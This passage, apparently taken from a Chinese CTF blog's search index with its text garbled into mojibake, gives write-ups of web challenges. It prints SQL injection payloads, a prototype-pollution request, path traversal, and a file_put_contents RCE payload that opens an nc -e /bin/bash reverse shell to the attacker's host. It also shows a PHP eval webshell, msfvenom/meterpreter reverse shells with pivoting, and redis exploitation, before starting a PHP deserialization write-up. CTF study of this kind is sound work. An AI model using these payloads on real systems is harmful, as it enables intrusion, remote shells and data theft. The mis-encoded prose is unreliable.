1ï¼Œ1`ä½†æ˜¯é€—å·è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨`limit 1 offset 1\rselect 3 æ›¿æ¢ä¸ºï¼š\nselect i.1 from (select * from ((select 1)A join (select 2)B join (select 3)C) union select * from users)i limit 1 offset 1\ræŸ¥è¯¢usernameåˆ—ï¼Œpasswordåˆ—æ›¿æ¢ä¸ºi.2ï¼Œi.3å³å¯\næœ€ç»ˆplayloadï¼š\nusername: 1\\\\\npassword:\nunion select * from(\r(select 1)A join (select 2)B join(\rselect i.3 from(\rselect * from (\r(select 1)A join (select 2)B join (select 3)C\r)union select * from users\r)i limit 1 offset 1\r)C\r)#\rå›æ˜¾ï¼š\n{\u0026ldquo;code\u0026rdquo;:2,\u0026ldquo;username\u0026rdquo;:\u0026ldquo;2\u0026rdquo;,\u0026ldquo;password\u0026rdquo;:\u0026quot;74b87337454200d4d33f80c4663dc5e5\u0026quot;,\u0026ldquo;result\u0026rdquo;:\u0026ldquo;SUCCESS\u0026rdquo;}\n0x02ç¬¬äºŒé¢˜ è€ƒç‚¹ï¼šJSåŸå‹é“¾æ±¡æŸ“ã€MySQLè¿œç¨‹ç™»å½•ä»»æ„æ–‡ä»¶è¯»å–\nç»™äº†index.jsæºç ï¼š\nvar express = require('express');\rvar router = express.Router();\rvar mysql = require('mysql');\rconst isObject = obj =\u0026gt; obj \u0026amp;\u0026amp; obj.constructor \u0026amp;\u0026amp; obj.constructor === Object;\rfunction merge(a, b) {\rfor (let attr in b) {\rif (isObject(a[attr]) \u0026amp;\u0026amp; isObject(b[attr])) {\rmerge(a[attr], b[attr]);\r} else {\ra[attr] = b[attr];\r}\r}\rreturn a\r}\rfunction waf(value){\rlet re = /(,| |or|\\||\\^|\u0026amp;|;|BENCHMARK|SLEEP)/ig;\rlet arr = value.match(re);\rif (arr === null){\rreturn 0;\r}\rreturn 1;\r}\rfunction clone(a) {\rreturn merge({}, a);\r}\rrouter.post('/', function(req, res, next) {\rlet body = JSON.parse(JSON.stringify(req.body));\rif (body.host != undefined) {\rres.json({\r\u0026quot;result\u0026quot;:\u0026quot;There is more to it!\u0026quot;\r});\r}else if (body.username === undefined || body.password === undefined){\rres.json({\r\u0026quot;code\u0026quot;:1,\r\u0026quot;result\u0026quot;:\u0026quot;username and password are necessary!\u0026quot;\r});\r}else if (waf(body.username)||waf(body.password)){\rres.json({\r\u0026quot;code\u0026quot;:1,\r\u0026quot;result\u0026quot;:\u0026quot;WAF!!!\u0026quot;\r});\r}else {\rlet copybody = clone(body);\rlet host = copybody.host == undefined ? \u0026quot;localhost\u0026quot; : copybody.host\rlet config = {\rhost: host,\ruser: 'root',\rpassword: '123456',\rdatabase: 'security'\r};\rlet connection = mysql.createConnection(config);\rconnection.connect();\rconnection.query('select * from users where uuuusername=\u0026quot;'+copybody.username+'\u0026quot; and ppppassword = \u0026quot;'+copybody.password+'\u0026quot;', function (error, results, fields) {\rif (error){\rres.json({\r\u0026quot;code\u0026quot;:1,\r\u0026quot;result\u0026quot;:\u0026quot;ERROR\u0026quot;\r});\r}else if (results[0] === undefined){\rres.json({\r\u0026quot;code\u0026quot;:1,\r\u0026quot;result\u0026quot;:\u0026quot;username or password error\u0026quot;\r});\r}else{\rres.json({\r\u0026quot;code\u0026quot;:2,\r\u0026quot;username\u0026quot;:results[0].uuuusername,\r\u0026quot;password\u0026quot;:results[0].ppppassword,\r\u0026quot;result\u0026quot;:\u0026quot;SUCCESS\u0026quot;\r});\r}\r});\rconnection.end();\r}\r});\rmodule.exports = router;\rå…ˆæ¥è¯´ä¸€è¯´JSåŸå‹é“¾æ±¡æŸ“ï¼š\nå…ˆè´´ä¸€ç¯‡å­¦ä¹ é“¾æ¥ï¼š\u0026raquo;æˆ³è¿™é‡Œ\nç®€å•æ¥è®²ï¼ŒJSçš„è¯­è¨€ç‰¹æ€§æ˜¯â€œä¸‡ç‰©çš†ä¸ºå¯¹è±¡ï¼ˆobject.prototypeï¼‰â€ï¼Œè¿™ä¹Ÿæ˜¯JSâ€œåŸºäºå¯¹è±¡â€çš„è§£é‡Š\n åœ¨javascriptä¸­ä¸€åˆ‡çš†å¯¹è±¡ï¼Œå› ä¸ºæ‰€æœ‰çš„å˜é‡ï¼Œå‡½æ•°ï¼Œæ•°ç»„ï¼Œå¯¹è±¡ éƒ½å§‹äºobjectçš„åŸå‹å³object.prototypeã€‚åŒæ—¶ï¼Œåœ¨jsä¸­åªæœ‰ç±»æ‰æœ‰prototypeå±æ€§ï¼Œè€Œå¯¹è±¡å´æ²¡æœ‰ï¼Œå¯¹è±¡æœ‰çš„æ˜¯__proto__å’Œç±»çš„prototypeå¯¹åº”  å¦‚æœæˆ‘ä»¬è®¿é—®ä¸€ä¸ªå¯¹è±¡é‡Œé¢å±æ€§ï¼ŒJSåˆ™ä¼šåœ¨è¿™ä¸ªå¯¹è±¡é‡Œé¢æŸ¥æ‰¾è¿™ä¸ªå±æ€§ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›ä¸Šä¸€çº§æŸ¥æ‰¾ã€‚\né‚£ä¹ˆåŸå‹é“¾æ±¡æŸ“å°±æ˜¯ï¼š\nåœ¨æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„ä»£ç ä¹‹å‰çš„èµ‹å€¼è¯­å¥å¦‚æœå¯æ§çš„è¯ï¼Œæˆ‘ä»¬è¿›è¡Œ â€”â€”proto èµ‹å€¼ï¼Œä¹‹åå°±å¯ä»¥åˆ©ç”¨ä»£ç äº†\nå¾ˆæ˜æ˜¾ï¼Œè¿™é“é¢˜æˆ‘ä»¬å¯ä»¥æ±¡æŸ“hostå±æ€§\n{\u0026quot;username\u0026quot;:\u0026quot;admin\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;__proto__\u0026quot;:{\u0026quot;host\u0026quot;:\u0026quot;æˆ‘çš„ip\u0026quot;}}\rè¿™é‡Œä¸ºä»€ä¹ˆè¦æ±¡æŸ“hostå±æ€§å‘¢ï¼Œå…¶å®æ˜¯ä¸ºäº†è§¦å‘ä¸‹ä¸€ä¸ªæ¼æ´â€”â€”Mysqlä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚\nç›´æ¥ä¸Šexpï¼šRogue-MySql-Server-master\nä¿®æ”¹å¯¹åº”ç«¯å£å°±è¡Œã€‚\n0x03ç¬¬ä¸‰é¢˜ è€ƒç‚¹ï¼š\n parse_urlè§£ææ¼æ´ã€PHPåè®®å®¹é”™æ€§ã€ç®€å•sqliã€file_put_contentsæ¼æ´ ç®€å•å†…ç½‘æ¸—é€ã€redisæœªæˆæƒè®¿é—®æ¼æ´ã€redisä¸»ä»å¤åˆ¶æ¼æ´  æ‰“å¼€é¢˜ç›®å³é€æºç ï¼š\n\u0026lt;?php\r//it may help u\recho \u0026quot;\u0026lt;h1\u0026gt;WELCOME 23333333333\u0026lt;/h1\u0026gt;\u0026quot;.\u0026quot;\\n\u0026quot;;\r$url = $_SERVER[\u0026quot;HTTP_REFERER\u0026quot;];\r$r = parse_url($url);\rif(!empty($r['host']) \u0026amp;\u0026amp; $r['host'] === 'localhost'){\rreadfile($url);// hint.txt\r}\relse{\recho 'ONLY FROM LOCALHOST!!!!'.\u0026quot;\u0026lt;br\u0026gt;\u0026quot;;\r}\r//only admin can do it\r$password = $_GET['password'];\r$username = $_GET['username'];\r$content = addslashes($_GET['content']);\rif($username === \u0026quot;******\u0026quot; \u0026amp;\u0026amp; $password === \u0026quot;******\u0026quot;){\recho 'now_you_are_admin'.\u0026quot;\u0026lt;br\u0026gt;\u0026quot;;\r$sandbox = './sandbox/' . md5(\u0026quot;x\u0026quot; . $_SERVER['REMOTE_ADDR']);\r@mkdir($sandbox);\r@chdir($sandbox);\recho $sandbox.\u0026quot;\u0026lt;br\u0026gt;\u0026quot;;\rif(!file_exists(\u0026quot;admin.php\u0026quot;)){\rfile_put_contents('admin.php', \u0026quot;\u0026lt;?php \\$secret = 'xxx'; ?\u0026gt;\u0026quot;);\r}\r//change the content\rif($content){\r$file = file_get_contents(\u0026quot;./admin.php\u0026quot;);\r$file = preg_replace(\u0026quot;/secret = '.*'/\u0026quot;, \u0026quot;secret = '{$content}'\u0026quot;, $file);\rfile_put_contents('./admin.php', $file);\r}\r}\rç¬¬5è¡Œparse_urlè§£ææˆ‘ä»¬åªéœ€è¦ä»»æ„\u0026lt;å­—æ¯ã€æ•°å­—\u0026gt;://\u0026lt;å­—æ¯ã€æ•°å­—\u0026gt;å°±å¯ä»¥è®©ä»–è¿”å›host=ç¬¬äºŒä¸ª\u0026lt;å­—æ¯ã€æ•°å­—\u0026gt;\n PHPåè®®çš„å®¹é”™æ€§ï¼šPHPåœ¨é‡åˆ°ä¸€ä¸ªä¸è®¤è¯†çš„åè®®çš„æ—¶å€™ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªwarningï¼Œå¹¶ä¸”å°†åè®®è®¾ç½®ä¸ºnullã€‚åé¢ï¼Œåœ¨åè®®æ˜¯nullæˆ–è€…æ˜¯fileæ—¶ï¼Œä¼šè¿›è¡Œæœ¬åœ°æ–‡ä»¶æ“ä½œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä½ æ²¡åŠ åè®®ï¼Œæˆ–è€…åŠ äº†ä¸ªä¸å­˜åœ¨çš„åè®®ï¼Œæˆ–è€…åè®®åå­—æ˜¯fileï¼Œéƒ½ä¼šè¢«è®¤ä¸ºæ˜¯æœ¬åœ°æ–‡ä»¶çš„ç›¸å…³æ“ä½œ  playloadï¼š\nreferer: 0://localhost/../../../ï¼ˆä¸€ä¸ªä¸€ä¸ªåŠ ï¼Œç›´åˆ°è¯»åˆ°æ–‡ä»¶ä¸ºæ­¢ï¼‰../hint.txt\rå›æ˜¾å‘Šè¯‰äº†usernameæ˜¯pig_can_flyå¹¶ä¸”è¯´passwordéœ€è¦åœ¨å¦ä¸€å°æœåŠ¡å™¨ä¸Šé¢è·å–ï¼Œæˆ‘ä»¬ç‚¹å‡»è®¿é—®ä»–ç»™çš„ipï¼Œå‘ç°å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„unionæ³¨å…¥ï¼Œå¾—åˆ°äº†passwordçš„md5å€¼ï¼šdc3565645d8002becb5fd7977aeef3e1\næš´åŠ›ç ´è§£ä¹‹åæ˜¯ï¼šadmin_password\nGETä¼ è¿‡å»ä¹‹åå‡ºç°äº†ä¸€æ®µJSä»£ç ï¼Œä¸è¿‡æˆ‘æ²¡åšï¼ˆ233333ï¼‰\ncontentå˜é‡é‚£é‡Œå¯ä»¥ç›´æ¥åˆ©ç”¨file_put_contentsæ¼æ´RCE\nplayloadï¼ˆGETä¼ å€¼ï¼‰ï¼š\n?username=pig_can_fly\u0026amp;password=admin_password\u0026amp;content=a\\';echo+`nc+-e+/bin/bash+æˆ‘çš„ip+ç«¯å£`//\ræˆ‘ä¹‹å‰è¯•äº†å¾ˆå¤šä¸ªï¼Œä¸çŸ¥é“ç©¶ç«Ÿæ˜¯å“ªä¸ªèµ·äº†ä½œç”¨ï¼Œåæ¥é—®äº†é—®å…¶ä»–äººï¼Œå¥½åƒåªæœ‰åå¼•å·æ‰èƒ½èµ·ä½œç”¨ã€‚\nå›åˆ°VPSç›‘å¬ç«¯å£ï¼Œæœç„¶æ”¶åˆ°äº†ä¸€ä»½æ–°é²œçš„shellï¼›\nèµ¶ç´§é‡æ–°å†™ä¸€ä¸ªåé—¨ï¼š\necho \u0026quot;\u0026lt;?php @eval(\\$_POST['123']);?\u0026gt;\u0026quot; \u0026gt; wh1sper.php\rèšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°shellï¼›\né«˜å…´äº†å¥½ä¸€é˜µï¼Œä¸è¿‡å¹¶æ²¡æœ‰æ‰¾åˆ°flagï¼Œé—®äº†å‡ºé¢˜äººï¼Œè¯´æ˜¯åœ¨å†…ç½‘ã€‚ã€‚ã€‚\nè”æƒ³åˆ°NCTF2019çš„true xml cookbookï¼Œè¯»å–/etc/hostsæ–‡ä»¶å’Œ/proc/net/arpï¼Œæ¨æµ‹å†…ç½‘å­˜æ´»ä¸»æœº10.0.0.1-3ï¼Œ2æ˜¯è‡ªå·±ï¼Œflagå¯èƒ½åœ¨3ä¸Šé¢ã€‚\näºæ˜¯åœ¨VPSä¸Šé¢è£…äº†MSFï¼Œé€šè¿‡msfçš„ä¸€äº›æ¨¡å—æ¢æµ‹åˆ°äº†ä¸€äº›ä¿¡æ¯ã€‚\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\u0026lt;Your IP Address\u0026gt; LPORT=\u0026lt;Your Port to Connect On\u0026gt; -f elf \u0026gt; shell.elf\råœ¨æœ¬åœ°ç”Ÿæˆäº†shell.elfæ–‡ä»¶é€šè¿‡èšå‰‘ä¸Šä¼ åˆ°ç›®å½•ï¼Œç»§ç»­åœ¨msfé‡Œé¢æ‰§è¡Œï¼š\nuse exploit/multi/handler\rset payloads linux/x86/meterpreter/reverset_tcp\rset lhost æˆ‘çš„ip\rset lport æˆ‘çš„ç«¯å£\rrun\ræ‰§è¡Œäº†è¿™äº›å‘½ä»¤ï¼Œå‘ç°msfå¼€å§‹ç›‘å¬ç«¯å£ï¼Œè¿™ä¸ªæ—¶å€™é€šè¿‡èšå‰‘ç»ˆç«¯è¿è¡Œ./shell.elfå‘½ä»¤ï¼Œå°±å¯ä»¥è·å¾—ä¸€ä¸ªmeterpreterç±»å‹çš„shell\nå¾—åˆ°shellä¹‹åï¼Œæˆ‘ä»¬éœ€è¦å…ˆå»ºç«‹meterpreteråŸºæœ¬éš§é“ä»£ç†\nmeterpreteråŸºæœ¬éš§é“ä»£ç† \u0026raquo;å­¦ä¹ è¿æ¥\n1.portfwd portfwd æ˜¯meterpreteræä¾›çš„ä¸€ç§åŸºæœ¬çš„ç«¯å£è½¬å‘ã€‚porfwdå¯ä»¥åå¼¹å•ä¸ªç«¯å£åˆ°æœ¬åœ°ï¼Œå¹¶ä¸”ç›‘å¬.ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹:\nmeterpreter \u0026gt; portfwd 0 total local port forwards.\rmeterpreter \u0026gt; portfwd -h\rUsage: portfwd [-h] [add | delete | list | flush] [args]\rOPTIONS:\r-L \u0026lt;opt\u0026gt; The local host to listen on (optional).\r-h Help banner.\r-l \u0026lt;opt\u0026gt; The local port to listen on.\r-p \u0026lt;opt\u0026gt; The remote port to connect to.\r-r \u0026lt;opt\u0026gt; The remote host to connect to.\rä½¿ç”¨å®ä¾‹ä»‹ç»ï¼š\nåå¼¹10.1.1.129ç«¯å£3389åˆ°æœ¬åœ°2222å¹¶ç›‘å¬é‚£ä¹ˆå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š\nmeterpreter \u0026gt; portfwd add -l 2222 -r 10.1.1.129 -p 3389\r[*] Local TCP relay created: 0.0.0.0:2222 \u0026lt;-\u0026gt; 10.1.1.129:3389\rmeterpreter \u0026gt; portfwd 0: 0.0.0.0:2222 -\u0026gt; 10.1.1.129:3389\r1 total local port forwards.\r2. pivot pivotæ˜¯meterpreteræœ€å¸¸ç”¨çš„ä¸€ç§ä»£ç†ï¼Œå¯ä»¥è½»æ¾æŠŠä½ çš„æœºå™¨ä»£ç†åˆ°å—å®³è€…å†…ç½‘ç¯å¢ƒï¼Œä¸‹é¢ä»‹ç»ä¸‹pivotçš„æ­å»ºå’Œä½¿ç”¨æ–¹æ³•\nä½¿ç”¨æ–¹æ³•route add ç›®æ ‡ipæˆ–ipæ®µ å­ç½‘æ©ç  sessionåºå·\nè¦ä½¿ç”¨ä»£ç†çš„ä¼šè¯ï¼Œé€šè¿‡å®ä¾‹æ¥è¯´æ˜ï¼š\nåœ¨metasploitæ·»åŠ ä¸€ä¸ªè·¯ç”±è¡¨ï¼Œç›®çš„æ˜¯è®¿é—®10.1.1.129å°†é€šè¿‡meterpreterçš„ä¼šè¯ 1 æ¥è®¿é—®ï¼š\nmsf exploit(handler) \u0026gt; route add 10.1.1.129 255.255.255.255 1\r[*] Route added\rmsf exploit(handler) \u0026gt; route print Active Routing Table\r====================\rSubnet Netmask Gateway\r------ ------- -------\r10.1.1.129 255.255.255.255 Session 1\rè¿™é‡Œå¦‚æœè¦ä»£ç†10.1.1.129/24 åˆ°session 1ï¼Œåˆ™å¯ä»¥è¿™ä¹ˆå†™ï¼š\nroute add 10.1.1.0 255.255.255.0 1\råˆ°è¿™é‡Œpivotå·²ç»é…ç½®å¥½äº†ï¼Œä½ åœ¨msfé‡Œå¯¹10.1.1.129è¿›è¡Œæ‰«æ(db_nmap)æˆ–è€…è®¿é—®(psexe æ¨¡å—ï¼Œsshæ¨¡å—ç­‰)å°†é€šè¿‡ä»£ç†session 1è¿™ä¸ªä¼šè¯æ¥è®¿é—®ã€‚\nä½†æ˜¯å¦‚æœæƒ³é€šè¿‡å…¶ä»–åº”ç”¨ç¨‹åºæ¥ä½¿ç”¨è¿™ä¸ªä»£ç†æ€ä¹ˆåŠå‘¢ï¼Ÿ\nè¿™æ—¶å€™å¯ä»¥å€ŸåŠ© metasploit socks4aæä¾›ä¸€ä¸ªç›‘å¬éš§é“ä¾›å…¶ä»–åº”ç”¨ç¨‹åºè®¿é—®ï¼š\né¦–å…ˆä½¿ç”¨ socks4aå¹¶ä¸”é…ç½®ï¼Œç›‘å¬ç«¯å£ï¼š\nmsf exploit(handler) \u0026gt; use auxiliary/server/socks4a msf auxiliary(socks4a) \u0026gt; show options Module options (auxiliary/server/socks4a):\rName Current Setting Required Description\r---- --------------- -------- -----------\rSRVHOST 0.0.0.0 yes The address to listen on\rSRVPORT 1080 yes The port to listen on.\rAuxiliary action:\rName Description\r---- -----------\rProxy msf auxiliary(socks4a) \u0026gt; exploit -y\r[*] Auxiliary module execution completed\rmsf auxiliary(socks4a) \u0026gt; [*] Starting the socks4a proxy server\ræŸ¥çœ‹ç›‘å¬ç«¯å£ï¼š\nroot@kali:~# netstat -an | grep \u0026quot;1080\u0026quot;\rtcp 0 0 0.0.0.0:1080 0.0.0.0:* LISTEN\rç«¯å£å·²ç»ç›‘å¬ï¼Œæ¥ç€é…ç½® proxychains\nroot@kali:~# vim /etc/proxychains.conf\r[ProxyList]\r# add proxy here ...\r# meanwileroot@kali:~# netstat -an | grep \u0026quot;1080\u0026quot;\rtcp 0 0 0.0.0.0:1080 0.0.0.0:* LISTEN # defaults set to \u0026quot;tor\u0026quot;\rsocks4 127.0.0.1 1080\rå®Œæˆä¹‹åæˆ‘ä»¬åœ¨å‘½ä»¤å‰é¢åŠ ä¸Šproxychainå°±å¯ä»¥æ­£å¸¸çš„ç”¨æœ¬æœºçš„å·¥å…·æ‰«æå†…ç½‘äº†\nè‡³äºé«˜ç«¯çš„äºŒçº§ä»£ç†ç”šè‡³å¤šçº§ä»£ç†å°±ä¸è°ˆäº†ã€‚\nè¿™é‡Œæˆ‘åªè¿›è¡Œäº†ç¬¬ä¸€æ­¥ï¼Œç”¨äº†msfé‡Œé¢çš„portscanæ‰«æäº†å†…ç½‘10.0.0.3ä¸»æœºçš„ç«¯å£ï¼Œå‘ç°åªæœ‰6379ç«¯å£å¼€æ”¾ï¼Œç½‘ä¸ŠæŸ¥é˜…èµ„æ–™åå¾—çŸ¥æ˜¯redisçš„ç«¯å£ï¼Œäºæ˜¯æˆ‘ç”¨äº†msfé‡Œé¢çš„å‡ ä¸ªæ¨¡å—è¿›è¡Œäº†å°è¯•ï¼Œå…¶ä¸­ï¼Œä½¿ç”¨redis_loginï¼ˆç”¨äºçˆ†ç ´ç™»å½•å¯†ç ï¼‰çš„æ—¶å€™ï¼Œmsfæç¤ºæˆ‘è¿™ä¸ªç«¯å£å¹¶æ²¡æœ‰è®¾ç½®å¯†ç ï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨redisæœªæˆæƒè®¿é—®æ¼æ´\näºæ˜¯æˆ‘æŠŠ6379ç«¯å£æ˜ å°„åˆ°äº†æœ¬åœ°çš„10086ï¼Œé€šè¿‡æœ¬åœ°çš„rediså®¢æˆ·ç«¯è¿›è¡Œäº†è®¿é—®\nredis-cli -h 127.0.0.1 -p 10086\r127.0.0.1:10086\u0026gt;\r127.0.0.1:10086\u0026gt;keys *\r1) \u0026quot;welcome\u0026quot;\r127.0.0.1:10086\u0026gt;\ræˆåŠŸäº†ï¼ï¼ï¼ä¸€é˜µç‹‚å–œè¿‡åå†™äº†å‡ ä¸ªé”®ï¼Œè£…äº†ä¸ªBï¼Œå¼€å§‹å°è¯•åˆ©ç”¨æ¼æ´ã€‚\n\u0026raquo;redisæ¼æ´æ·±åº¦åˆ©ç”¨\nä¸€èˆ¬æ¥è®²ï¼Œç½‘ä¸Šçš„å‡ ç§æ–¹æ³•ï¼š\n(1).åˆ©ç”¨è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘½ä»¤åå¼¹shell\r(2).å†™ssh-keygenå…¬é’¥ç„¶åä½¿ç”¨ç§é’¥ç™»é™†\r(3).å¾€webç‰©ç†è·¯å¾„å†™webshell\rä½†æ˜¯æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ(1)éœ€è¦/var/spool/cron/è·¯å¾„å­˜åœ¨å¹¶ä¸”æœ‰æƒé™ï¼Œ(2)éœ€è¦22ç«¯å£å¼€æ”¾ï¼Œ(3)éœ€è¦80ç«¯å£å¼€æ”¾å¹¶ä¸”å¯åŠ¨äº†webæœåŠ¡ã€‚\næ˜¾ç„¶å­¦é•¿æ²¡ç»™å¼¹shellçš„æœºä¼šï¼Œ/var/spool/cron/ç›®å½•æ ¹æœ¬ä¸å­˜åœ¨å…¶ä»–ä¸¤ä¸ªç«¯å£éƒ½æ²¡å¼€å°±ä¸è°ˆäº†ã€‚ã€‚ã€‚\nä¸è¿‡æœ‰è¶£çš„æ˜¯ï¼Œæˆ‘åˆ©ç”¨äº†redisçš„config set dir /flagæ‘¸æ¸…æ¥šäº†flagåœ¨æ ¹ç›®å½•ï¼Œä¸è¿‡æ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆå§¿åŠ¿å¯ä»¥è®©redisç›´æ¥è¯»å–ç³»ç»Ÿæ–‡ä»¶çš„ã€‚\nåæ¥çœ‹åˆ°äº†redisçš„ä¸€ä¸ªä¸»ä»æœºåˆ¶ï¼Œä¹Ÿæ²¡æœ‰å¾€é‚£æ–¹é¢æƒ³ï¼Œäºæ˜¯æœ¬é¢˜å®£å‘Šç™½ç»™ã€‚\nwakawakaå¸ˆå‚…ï¼ˆæœ€nbçš„ç”·äººï¼‰ç”¨redisçš„ä¸»ä»å¤åˆ¶æ¼æ´æäº†ä¸€å‘ï¼Œæ²¡æˆåŠŸï¼Œé—®å­¦é•¿è¯´æ˜¯ç¯å¢ƒé—®é¢˜ï¼Œç»™é€šè¿‡äº†ã€‚\nWPåœ¨è¿™é‡Œå°±ç»“æŸäº†ï¼Œredisçš„ä¸»ä»å¤åˆ¶æ¼æ´æ”¹æ—¥åœ¨æœ¬åœ°å¤ç°ä¹‹åå†æ›´ã€‚\næ›´æ–°ï¼š\nåŸç†å¯ä»¥ç™¾åº¦ï¼Œè¿™é‡Œç›´æ¥æœ¬åœ°ç”¨Githubä¸Šé¢çš„redis-rogue-getshell-masteræ‰“é€šï¼Œæœ¬åœ°çš„expæ‰“docker:ï¼ˆæœ¬åœ°ä¸éœ€è¦rediså®¢æˆ·ç«¯ï¼‰\npython3 redis-master.py -r ç›®æ ‡ip -p ç›®æ ‡ç«¯å£ -L æœ¬æœºip -P æœ¬æœºç«¯å£ -f ä½¿ç”¨çš„exp -c è¦æ‰§è¡Œçš„å‘½ä»¤\r","date":"2020-04-01T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164754.jpeg","permalink":"https://anthem-whisper.github.io/p/2020-x1ct34m-web%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%80%83%E6%A0%B8/","title":"2020 X1cT34m Webç¬¬ä¸€æ¬¡è€ƒæ ¸"},{"content":"å¤ç°åœ°å€ï¼šBUUOJ\næ‰“å¼€é¢˜ç›®å³é€æºç ï¼šMRCTF_ezpop\nå…ˆè¯´PHPçš„ä¸€äº›é­”æœ¯æ–¹æ³•ï¼š\n__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘\r__sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘\r__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘\r__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘\r__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘\r__get() //ç”¨äºä»ä¸å¯è®¿é—®ï¼ˆæˆ–ä¸å­˜åœ¨ï¼‰çš„å±æ€§è¯»å–æ•°æ®\r__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§\r__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘\r__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘\r__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘\r__invoke() //å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘\ræœ‰äº†è¿™äº›çŸ¥è¯†åï¼Œæˆ‘ä»¬å†æ¥åˆ†ææºç ï¼›\nWelcome to index.php\r\u0026lt;?php\r//flag is in flag.php\r//WTF IS THIS?\r//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5\r%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\r//And Crack It!\rclass Modifier {\rprotected $var;\rpublic function append($value){\rinclude($value);\r}\rpublic function __invoke(){\r$this-\u0026gt;append($this-\u0026gt;var);\r}\r}\rclass Show{\rpublic $source;\rpublic $str;\rpublic function __construct($file='index.php'){\r$this-\u0026gt;source = $file;\recho 'Welcome to '.$this-\u0026gt;source.\u0026quot;\u0026lt;br\u0026gt;\u0026quot;;\r}\rpublic function __toString(){\rreturn $this-\u0026gt;str-\u0026gt;source;\r}\rpublic function __wakeup(){\rif(preg_match(\u0026quot;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026quot;, $this-\u0026gt;source)) {\recho \u0026quot;hacker\u0026quot;;\r$this-\u0026gt;source = \u0026quot;index.php\u0026quot;;\r}\r}\r}\rclass Test{\rpublic $p;\rpublic function __construct(){\r$this-\u0026gt;p = array();\r}\rpublic function __get($key){\r$function = $this-\u0026gt;p;\rreturn $function();\r}\r}\rif(isset($_GET['pop'])){\r@unserialize($_GET['pop']);\r}\relse{\r$a=new Show;\rhighlight_file(__FILE__);\r}\ræˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨Modifierç±»é‡Œé¢æœ‰ä¸€ä¸ªincludeå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªåŒ…å«flag.php\nclass Modifier {\rprotected $var;\rpublic function append($value){\rinclude($value);\r}\rpublic function __invoke(){\r$this-\u0026gt;append($this-\u0026gt;var);\r}\r}\rå½“æˆ‘ä»¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶ï¼Œ__invoke()å°±ä¼šè‡ªåŠ¨åŒ…å« $var\næ‰€ä»¥ï¼Œæˆ‘ä»¬åˆçœ‹åˆ°äº†Testç±»é‡Œé¢ï¼š\nclass Test{\rpublic $p;\rpublic function __construct(){\r$this-\u0026gt;p = array();\r}\rpublic function __get($key){\r$function = $this-\u0026gt;p;\rreturn $function();\r}\r}\rå½“æˆ‘ä»¬è®¿é—®Testç±»é‡Œé¢ä¸€ä¸ªä¸å¯è§æˆ–è€…ä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼Œ__get()è‡ªåŠ¨ä»¥å‡½æ•°çš„æ–¹å¼è°ƒç”¨$p;\né‚£ä¹ˆï¼Œæºç é‡Œé¢é‚£é‡Œèƒ½å¤Ÿè®¿é—®ä¸€ä¸ªå±æ€§å‘¢ï¼Ÿ\nShowç±»ï¼š\nclass Show{\rpublic $source;\rpublic $str;\rpublic function __construct($file='index.php'){\r$this-\u0026gt;source = $file;\recho 'Welcome to '.$this-\u0026gt;source.\u0026quot;\u0026lt;br\u0026gt;\u0026quot;;\r}\rpublic function __toString(){\rreturn $this-\u0026gt;str-\u0026gt;source;\r}\rpublic function __wakeup(){\rif(preg_match(\u0026quot;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026quot;, $this-\u0026gt;source)) {\recho \u0026quot;hacker\u0026quot;;\r$this-\u0026gt;source = 